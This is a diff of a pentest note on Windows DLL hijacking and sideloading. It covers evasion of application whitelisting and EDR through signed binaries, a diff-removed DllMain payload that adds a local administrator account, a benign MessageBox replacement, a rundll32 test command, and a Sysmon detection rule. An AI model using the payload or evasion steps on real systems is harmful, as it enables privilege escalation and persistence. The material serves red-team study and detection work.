@@ -1,5 +1,7 @@
 # DLL Hijacking/Sideloading
 
+> WHAT ARE DLLs : At its core, a Dynamic Link Library (DLL) is a file containing code and data that multiple programs can use simultaneously. DLLs are a crucial component in the Windows operating system because Windows heavily relies on them for pretty much anything. Think of it as a shared repository of functionality, accessible to any application that needs it. Unlike static libraries, which are integrated into an application at compile time, DLLs are loaded into memory at runtime, providing a level of flexibility and modularity that is essential for software integrity. Each process started on Windows uses DLLs in order to operate properly. Additionally, DLLs can be also custom made, which means that for different software vendors, dedicated DLLs can be encountered. Usually they are programmed in C/C++, however, this is not the only option. 
+
 > ***IMPORTANT***: We achieve not only `Privilege Escalation`, but also `code-execution` and `persistence`!!!
 
 > Additionally, DLL Hijacking bypasses application whitelisteng (applocker/WDAC) and breaks the EDR execution chain, as the DLL is loaded by a signed microsoft executable (i.e. Onedrive), dns/http requests are no longer abnormal
@@ -16,14 +18,12 @@ Why? EDR's will check if dll's loaded by LOL windows binaries happen from the ri
 
 Additionally OLEVIEW will
 
-```csharp
+```c
 #include <windows.h>
- 
-BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
-    if (dwReason == DLL_PROCESS_ATTACH) {
-        system("cmd.exe /k net user localadmin Password1 /add");
-        system("cmd.exe /k net localgroup administrators localadmin /add");
-        ExitProcess(0);
+
+BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID p) {
+    if (r == DLL_PROCESS_ATTACH) {
+        MessageBoxW(NULL, L"DLL sideload successful!", L"Debug", MB_OK | MB_ICONINFORMATION);
     }
     return TRUE;
 }
@@ -79,5 +79,49 @@ https://juggernaut-sec.com/dll-hijacking/#Hijacking_the_Service_DLL_to_get_a_SYS
 
 ![image](./images/dllsearch.jpg)
 
+# C dll
+
+building your dll
+
+<https://github.com/Pascal-0x90/sideloadr>
+<https://github.com/Pascal-0x90/sideloadr/compare/master...WS-G:sideloadr:master>
+
+
+```bash
+rundll32 shell32.dll,Control_RunDLL c:\thev\labs\DLL_Sideloading\version.dll
+```
+
+LoaderLock!!!
+
+<https://www.prodefense.io/blog/dll-sideloading>
+
 # BYOB (Bring Your own Binary)
 OLEVIEW
+
+# DETECTION
+
+Use sysmon to look for loading of known system32/syswow dll's that are :
+- not signed
+- not loaded from their usual locaction (system32/syswow)
+
+<https://github.com/TactiKoolSec/SideLoadHunter>
+
+```yaml
+<Sysmon schemaversion="4.32">
+   <!-- Capture all hashes -->
+   <HashAlgorithms>*</HashAlgorithms>
+   <DnsLookup>False</DnsLookup>
+   <ArchiveDirectory>Archive</ArchiveDirectory>
+   <EventFiltering>
+		<RuleGroup name="onedrivestandaloneupdater_sideload" groupRelation="and">
+			<!-- Log only image loads where modules match these conditions -->
+			<ImageLoad onmatch="include">
+				<Image condition="contains">onedrivestandaloneupdater.exe</Image>
+				<ImageLoaded condition="contains">wofutil.dll</ImageLoaded>
+				<Signature condition="is not">Microsoft Windows</Signature>
+			</ImageLoad>
+		</RuleGroup>
+  </EventFiltering>
+</Sysmon>
+```
+>Custom detection rules for known Windows DLLs being loaded from non Windows path’s such as System32 could also be used to identify DLL Sideloading attacks. Doing this for non Windows DLLs however is not that easy, as there are too many different vendors and binaries/DLLs to track all of them.
